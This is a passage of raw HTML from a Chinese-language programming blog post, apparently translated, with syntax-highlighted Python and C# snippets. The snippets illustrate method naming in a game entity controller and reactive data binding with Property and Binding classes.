class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><strong>然后</strong>，写出 <span class=\"code\">killLocal() 函数的实现代码。</span></p>\n<h3>命名</h3>\n<p>对命名如此多地关注，可能看起来很奇怪。但就像老笑话一样，这是计算机科学中尚未解决的两个问题之一。另一个是缓存失效和差一 错误（off-by-one errors）。</p>\n<p>看一下这些函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c150c195730410\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Python</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass TeamEntityController(Controller):\r\n\r\n    def buildSpawnPacket(self):\r\n        # ...\r\n\r\n    def readSpawnPacket(self):\r\n        # ...\r\n\r\n    def serverUpdate(self):\r\n        # ...\r\n\r\n    def clientUpdate(self):\r\n        # ...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c150c195730410-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150c195730410-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150c195730410-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150c195730410-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150c195730410-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150c195730410-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150c195730410-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150c195730410-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150c195730410-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150c195730410-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150c195730410-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150c195730410-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150c195730410-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c150c195730410-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TeamEntityController</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Controller</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150c195730410-2\"> </div><div class=\"crayon-line\" id=\"crayon-594bab39c150c195730410-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">buildSpawnPacket</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150c195730410-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c150c195730410-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150c195730410-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">readSpawnPacket</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c150c195730410-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150c195730410-8\"> </div><div class=\"crayon-line\" id=\"crayon-594bab39c150c195730410-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">serverUpdate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150c195730410-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c150c195730410-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150c195730410-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">clientUpdate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c150c195730410-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>显然，前两个函数是相互关联的，最后两个函数也是相关的。但是它们没有通过命名来反映这个事实。 在 IDE 中，这些功能将不会在自动完成菜单项中相邻显示。</p>\n<p>一种更好地命名方式是，以相同的方式开始，并以不同的方式结束。如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c150f866212394\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Python</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass TeamEntityController(Controller):\r\n\r\n    def packetSpawnBuild(self):\r\n        # ...\r\n\r\n    def packetSpawnRead(self):\r\n        # ...\r\n\r\n    def updateServer(self):\r\n        # ...\r\n\r\n    def updateClient(self):\r\n        # ...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c150f866212394-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150f866212394-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150f866212394-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150f866212394-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150f866212394-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150f866212394-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150f866212394-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150f866212394-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150f866212394-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150f866212394-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150f866212394-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c150f866212394-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c150f866212394-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c150f866212394-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TeamEntityController</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Controller</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150f866212394-2\"> </div><div class=\"crayon-line\" id=\"crayon-594bab39c150f866212394-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">packetSpawnBuild</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150f866212394-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c150f866212394-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150f866212394-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">packetSpawnRead</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c150f866212394-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150f866212394-8\"> </div><div class=\"crayon-line\" id=\"crayon-594bab39c150f866212394-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">updateServer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150f866212394-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c150f866212394-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c150f866212394-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">updateClient</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c150f866212394-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>自动补全对话框在显示这些代码时也更加易于理解。</p>\n<h2>2010-2015年</h2>\n<p>有了 12 年的编程经验后，我才已完成了一个完整的游戏项目。</p>\n<p><iframe width=\"600\" height=\"450\" src=\"http://v.qq.com/iframe/player.html?vid=y0511483sio\" frameborder=\"0\" allowfullscreen=\"allowfullscreen\"></iframe></p>\n<p>虽然，到目前为止我已经学习了很多编程知识，但这个游戏却是我所犯下的一些重大错误的特辑。</p>\n<h3>数据绑定</h3>\n<p>当时，「响应式」UI 框架编程之风刚刚兴起，像微软的 MVVM 和 Google 的 Angular 。现在，这种风格的编程主要集中在 React 中。</p>\n<p>所有这种类型的框架都基于相同的基础 promise 库。它们向你展示一个 HTML 文本字段，一个空的 &lt;span&gt; 标签元素和一行绑定二者的脚本代码。在文本字段中键入，然后「嘭」！ &lt;span&gt; 标签中的内容不可思议地更新了。</p>\n<p>在游戏的上下文中，它看起来像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c1513666828165\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class Player\r\n{\r\n    public Property&lt;string&gt; Name = new Property&lt;string&gt; { Value = \"Ryu\" };\r\n}\r\n\r\npublic class TextElement : UIComponent\r\n{\r\n    public Property&lt;string&gt; Text = new Property&lt;string&gt; { Value = \"\" };\r\n}\r\n\r\nlabel.add(new Binding&lt;string&gt;(label.Text, player.Name));</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c1513666828165-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1513666828165-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1513666828165-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1513666828165-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1513666828165-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1513666828165-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1513666828165-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1513666828165-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1513666828165-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1513666828165-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1513666828165-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c1513666828165-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Player</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1513666828165-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1513666828165-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">Property</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">string</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">Property</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">string</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Ryu\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1513666828165-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1513666828165-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1513666828165-6\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TextElement</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">UIComponent</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1513666828165-7\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1513666828165-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">Property</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">string</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Text</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">Property</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">string</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1513666828165-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1513666828165-10\"> </div><div class=\"crayon-line\" id=\"crayon-594bab39c1513666828165-11\"><span class=\"crayon-v\">label</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">string</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">label</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Text</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>哇，现在，UI 会根据玩家的名字自动更新！我可以保持 UI 和游戏代码完全独立。这是很吸引人的，因为我们通过游戏的状态推导出 UI 状态，从而消除了游戏中的 UI 状态变量。</p>\n<p>然而，这里仍有一些危险信号。 我不得不将游戏中的每一个字段都转换成一个 Property 对象，该对象包含依赖于它的绑定列表：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c1516921176195\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class Property&lt;Type&gt; : IProperty\r\n{\r\n    protected Type _value;\r\n    protected List&lt;IPropertyBinding&gt; bindings; \r\n\r\n    public Type Value\r\n    {\r\n        get { return this._value; }\r\n        set\r\n        {\r\n            this._value = value;\r\n\r\n            for (int i = this.bindings.Count - 1; i &gt;= 0; i = Math.Min(this.bindings.Count - 1, i - 1))\r\n                this.bindings[i].OnChanged(this);\r\n        }\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1516921176195-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1516921176195-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1516921176195-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1516921176195-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1516921176195-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1516921176195-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1516921176195-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1516921176195-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1516921176195-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">Property</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Type</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IProperty</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1516921176195-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">protected</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Type </span><span class=\"crayon-v\">_value</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1516921176195-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">protected</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">List</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">IPropertyBinding</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bindings</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1516921176195-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Type</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Value</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1516921176195-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">get</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">_value</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-9\"><span 